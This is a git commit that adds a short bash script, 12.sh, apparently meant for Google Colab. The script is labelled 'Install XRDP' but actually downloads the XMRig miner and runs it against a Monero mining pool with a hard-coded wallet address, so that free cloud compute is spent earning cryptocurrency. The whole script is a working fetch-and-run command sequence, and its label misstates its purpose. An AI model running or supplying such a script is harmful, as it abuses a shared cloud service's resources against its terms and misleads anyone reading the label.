5e0c8b340ca9530b72d0b8c9e79bbdc398d52f91
스카이랜드 <83498837+sukairando@users.noreply.github.com>
2022-03-06 15:30:44 +0900

    Create 12.sh

---
+++ 12.sh
@@ -0,0 +1,13 @@
+#! /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
+tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
+cd xmrig-6.16.4
+./xmrig -o us-west.minexmr.com:443 -u 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQqhpX3qhyuwPPP2eGM -k --tls --rig-id GC-US
